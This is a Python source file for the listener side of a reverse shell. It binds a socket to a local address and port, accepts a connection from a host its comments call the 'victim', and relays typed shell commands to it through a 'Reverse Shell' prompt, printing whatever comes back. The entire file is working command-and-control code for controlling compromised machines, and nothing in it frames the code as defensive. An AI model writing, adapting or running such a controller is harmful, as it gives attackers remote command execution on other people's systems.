import socket
import json
import os

IP_ADDRESS = '192.168.0.16'
# Port no. > 1000 is OK
PORT = 54321

# Passing 'data' as an argument
# 'data' = command we send to victims
def reliable_send(data):
    jsondata = json.dumps(data)
    # target = target, ip = sock.accept() below
    # jsondata has to be encoded to send ascii to victims as BYTEs
    target.send(jsondata.encode())
    
def reliable_recv():
    # Preparing to store data
    data = ''
    while True:
        try:
            # Specify amount of BYTEs we wanna receive
            # Cuz data sending from victims are encoded BYTEs
            # Need to decode it upon receiving using .decode()
            # Need to trim the fucking '\n' '\r' to avoid errors using rstrip()
            data += target.recv(1024).decode().rstrip()
            # returning results
            return json.loads(data)
        except ValueError as e:
            # When we receive ValueError from execution
            # We continue the execution
            print(f'Error occurred: {e}\nContinuing...')
            continue

def target_communication():
    while True:
        # Once we type in str(ip)
        # str(ip) display as => * Reverse Shell~str(ip)
        # ip = target, ip = sock.accept()
        command = input('* Reverse Shell~%s: ' % str(ip))
        # A callback to send commands to victims
        reliable_send(command)
        
        # Server command input 'q' to exit shell
        if command == 'q':
            break
        # From beginnging up to 3rd CHAR
        # 'cd' command do nothing on Server
        # 'cd' command works in client
        elif command[:3] == 'cd ':
            # From 3rd CHAR till the end
            pass
        # Executing 'clear' on Server
        elif command == 'clear':
            os.system('clear')
        else:
            # A callback
            # To receive results from victims once we fire our commands
            result = reliable_recv()
            # Printing result from reliable_recv() to Server screen
            # return json.loads(data)
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Binding our Server IP to the PORT
sock.bind((IP_ADDRESS, PORT))
print('[+] Listening for Incoming connections ;)')
# Listening up to 5 connections
sock.listen(5)
# sock.accept() accepting target socket object
# sock.accept() accepting target IP
target, ip = sock.accept()
print('[+] Target connected from: ' + str(ip))

# A function acting as a callback
# handling victims' communications to our server
target_communication()
